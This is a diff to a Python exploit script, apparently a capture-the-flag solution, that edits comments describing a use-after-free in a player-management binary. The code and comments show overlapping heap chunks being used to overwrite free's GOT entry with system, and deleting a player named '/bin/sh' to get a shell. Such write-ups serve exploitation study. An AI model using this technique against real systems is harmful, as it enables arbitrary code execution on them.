@@ -79,18 +79,18 @@ if __name__ == "__main__":
     remove(2)                           
     raw_input('after removing C...')
 
-    # set_name() references the variable 'selected' even after the chunk has gone! (UaF)
+    # delete_player() should have set 'selected' to NULL, but it didn't.
+    # set_name() references the variable 'selected' even after the chunk it points has gone! (UaF)
     #
     # typedef struct _player_st { _DWORD attack, defense, speed, precision; char * name_ptr } player_st;
+    #
+    # add_player() allocates two chunks, payer_st and name. 
     # -> malloc(sizeof(player_st)) -> 24 bytes from LIFO fastbin (previous chunk C-1)
     # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
-    # so, 'selected' overlaps with chunk E-2 (player name "EEEEE....")
-    # so, (removed) chunk A-1 overlaps with chunk E-2.
+    # so, chunk A-1 which has been deleted overlaps with chunk E-2 (player name "EEEEE....")
     # so, a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
-    # and future set_name() on the removed chunk A will reference the overwritten pointer.
-    # -> strcpy(*(char **)(selected + 16), &s);
-    # -> *(select + 16) == 0x603018
-    # -> strcpy(0x603018, system_addr)
+    # so we can manipulate 'chunk A-1'->name_ptr.
+    # and future set_name() will reference the overwritten pointer. 
 
     add('E'*16 + p64(b.got['free']), 0xfe)
     raw_input('after adding E...')
@@ -115,6 +115,6 @@ if __name__ == "__main__":
     add('/bin/sh', 0xff)
 
     raw_input('after adding /bin/sh...')
-    r.send('2\n1\n')
+    r.send('2\n1\n') # delete_player() will try to free("/bin/sh") which becomes system("/bin/sh")
 
     r.interactive()
